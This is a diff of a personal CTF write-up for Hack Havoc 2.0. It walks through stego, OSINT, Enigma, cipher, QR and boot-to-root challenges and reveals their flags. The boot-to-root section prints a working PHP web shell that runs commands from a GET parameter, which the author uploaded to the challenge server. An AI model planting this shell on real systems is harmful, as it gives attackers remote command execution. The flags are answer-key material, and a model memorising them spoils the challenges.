@@ -1,11 +1,11 @@
-**Welcome to Hack Havoc 2.0 CTF!**  
- Some how i liked  this ctf & Placed in 6TH Position.  
+****Welcome to Hack Havoc 2.0 CTF!**  
+Some how i liked  this ctf & Placed in 6TH Position.  
 **what Made me intrest ?**
 Prizes  
 PJPT Certification by TCM  
 HackTheBox Gift Voucher (3 Months VIP) + Ebook  
 Top 10 Participants: 1-hour Career Consultation with Cybersecurity Leader  
-Top 20 Participants: Access to internship opportunities at CyberMaterial and 911Cyber  
+Top 20 Participants: Access to internship opportunities at CyberMaterial and 911Cyber**  
 
 <img src="Images/CTF.jpg" alt="Challenge Image" width="200"/>
 
@@ -103,6 +103,7 @@ Finally after running this you will get to know this is password is ***7¡Vamos!
 ```bash
 steghide  steghide extract -sf file.jpg -p *7¡Vamos!
 cat flag.txt
+**CM{Bru73_f0rc3_i5_b35t}**
 ```
 
 <!-- -->
@@ -174,7 +175,7 @@ After seeing flag format CM{xxxxx_#x_#xxx#_#_x##xxx} i had connected all pieces 
 ---
 
 
-**Category** - **OSINT**
+**Category** - **OSINT**  
 **Challenge** - **Hack Uncovered**
 > Think you can find the flag buried in a sea of data? This PDF is packed with juicy details about July's 2024 incidents/alerts, but beware 
 > somewhere within lies your prize! Can you navigate the top threats, Vulnerability, and regulations to uncover what’s hidden? and Craft the flag > with the name Put your OSINT skills to the test! 🕵️‍♀️📄              Flag : CM{a_b_c}
@@ -189,3 +190,159 @@ They clearly menctioned to search about **top threats**, **Vulnerability**, **re
 **regulations = KOPSA**  
 Combining this we get flag  
 **CM{DarkGate_CVE-2024-5217_KOPSA}**  
+
+
+**Challenge** - **CyberMaterial Edition!**
+> Hall of Hacks July 2024 Edition delves into the latest cybersecurity triumphs and crises, spotlighting top threat actors from hacktivists to >cybercriminals, alongside major breaches, legal battles, and industry-shaping developments.
+> 
+> But wait—there’s a hidden flag buried among the chaos!
+
+For this challenge i searched a lottt...... & Finall i got a linkedin post with same descreption but at starting those pictures didn't shown anything. And i read challenge descreption again **But wait—there’s a hidden flag buried among the chaos!** & Then i clearly seen all images again & then i got it  
+<img src="Images/CyberMaterial Edition!.png" alt="Challenge Image" width="200"/>  
+
+
+-----
+
+
+**Category** - **REV**  
+**Challenge** - **More Like ‘Enig-me’**
+
+> The Enigma Machine was a complex encryption device used by the German military during World War II. Its intricate design and multiple settings > made it incredibly difficult to crack. In this challenge, you'll take on the role of a codebreaker and attempt to decipher a message encrypted > using a modified Enigma Machine.
+>
+> Encoded txt : ugtyq djiwc ruejq ebdux hcrqr kiznu hokzy sngry zfxnv gbjki dqknr ma
+> 
+> Decoded txt: cybermateial is the world number one cybersecurity data platform.
+> 
+> Your flag follows the format CM{Rotor_x-x-x_Pos_x-x-x_Reflector_x_Plug_x-x_x-x_Ring_x-x-x}. Good luck decoding the mystery!"
+
+>Update:More Like ‘Enig-me’
+>Challenge is updated 
+>Rotor:
+>Hint: "These are the first three rotors historically used by the German military Enigma during WWII."
+>Position:
+>Hint: "The initial rotor positions are aligned with the start of the alphabet but include two letters beyond the first."
+>Reflector:
+>Hint: "This reflector was the most commonly used during the war, and it shares its name with the second letter of the alphabet."
+>Plugboard:
+>Hint: "The plugboard swaps involve pairs of letters commonly found at the start of words like 'Apple' and 'Tree,' and 'Banana' and 'Lemon.'"
+>Ring Position:
+>Hint: "The rings are set to the beginning of the alphabet, leaving no shifts at all."
+
+For this chall i had used hint's they clearly menctioned where what to use.  
+<img src="Images/Enigma.png" alt="Challenge Image" width="200"/>  
+**CM{Rotor_I-II-II_Pos_A-D-F_Reflector_B_Plug_A-T_B-L_Ring_A-A-A}**
+
+
+---------
+
+**Category** - **MISC**  
+**Challenge** - **The Case of the Missing Flag**
+
+
+> Congratulations, detective! You’ve found ABC.dat, the file that’s about as exciting as watching paint dry. But wait! Rumor has it there’s a flag tucked away in there, possibly hiding RQ.
+> 
+> Can you solve the mystery before your snacks run out? Get cracking, and may the bytes be ever in your favor!
+
+First what is .dat file ???? **a data file that stores information specific to the program that created it** So we can open it in notepad right ??
+I got some svg file in that which look's a Qr code. So i converted it to a Png file & then scanned with google len's i don't know why it didn't scanned. And then again i scanned with a qr code Scanner app **CM{F0r3n3ic_1s_34sy}** this flag appeared. 
+
+
+------------
+
+**Category** - **CRYPTO**  
+**Challenge** - **The Curious Case of the Jumbled Symbols**
+>Dive into a tangled web of characters! Can you decode {╵⸍⸝╮ᛁ⸌ᛁ╵╵_◟╮ᛁ⸜╵_ᛙ╮ᚽ⸝◟ᛍ} ? Here’s a clue: It’s not what it seems—things aren’t always as clear as they appear. Good luck, puzzle master!
+>
+>Wrap Flag in CM{}
+>
+
+This challenge is as easy as it. I just pased this ( ╵⸍⸝╮ᛁ⸌ᛁ╵╵_◟╮ᛁ⸜╵_ᛙ╮ᚽ⸝◟ᛍ ) on google i get to know it is (rune-translator) 
+ [https://valhyr.com/pages/rune-translator]  
+<img src="Images/crypto-1.png" alt="Challenge Image" width="200"/>  
+
+
+
+**Challenge** - **CyberMaterialHavoc**
+
+>We heard you're a great CybermaterialHavoc! 🧙‍♂️ Help us decode this baffling message: 🕵️‍♀️💥
+>
+>AgTIEe5hQ?T5,W.GDyv^N*eRcDuEoizyHNSTN&b$$4m0o9gWL!S\u+^T;/o5m/9YL@HQlje}
+
+In Hint's they already menctioned this will be a 3 level encryption So i opned (dcode)[https://www.dcode.fr/cipher-identifier]
+
+- In Level one it detected it as Base 92 after decrypting i got this ZL{YfphiGdxdicgo_Yzkqu'i_Cmtg_Qfpdiscxawtiz_Xdxl_Khdxcltu}
+- Again i used dcode.fr this time it dected as Vigenere Cipher. But wait what key can be???? The only thing they highlighted  is CybermaterialHavoc
+  So i used it & then this decrypted to XN{XbyviNzgvirzo_Dliow'h_Yvhg_Xbyvihvxfirgb_Wzgz_Kozgulin}
+- Again i used decode.fr this dected as Atbash Cipher so i used it, this one provided me a flag **CM{CyberMaterial_World's_Best_Cybersecurity_Data_Platform}** another easy challenge 
+
+
+
+
+----
+
+
+
+**Category** - **Boot To Root**  
+**Challenge** - **Hacker's Fortress**  
+
+> In this boot-to-root exercise, participants will need to leverage their skills in file uploading and privilege escalation to uncover a hidden flag. The challenge simulates a real-world scenario where unauthorized access to a server must be achieved to find sensitive information.
+> 
+> http://35.208.110.64
+
+
+At starting i got fooled & tired many thing's like jpg, png, jpg for shell. That didn't worked. What i did is uploded a php shell 
+
+```php
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+```
+
+```HTML
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
+```
+ Just upload this & then open your uploded file in /uploads. And see what file are existing on server  & Hidden file tooo. **ls -a**
+Hheheh we got a flag   **CTF{3sc4l4t3d_t0_r00t}**
+
+
+
+-------
+
+**Category** - **web**  
+**Challenge** - **Hashing Numbers**
+
+
+> To access its secrets, you must first prove your worth by calculating a mathematical expression, a test of both intellect and skill. Will you rise to the challenge and secure the sensitive information, or will the secrets remain forever locked away? The choice is yours.
+
+> Flag structure: CM{XXX-###_##}
+>
+>https://sites.google.com/cybermaterial.com/hashing-numbers
+
+I was not able to figure out what to do`
+
+
+
+
+
+
+
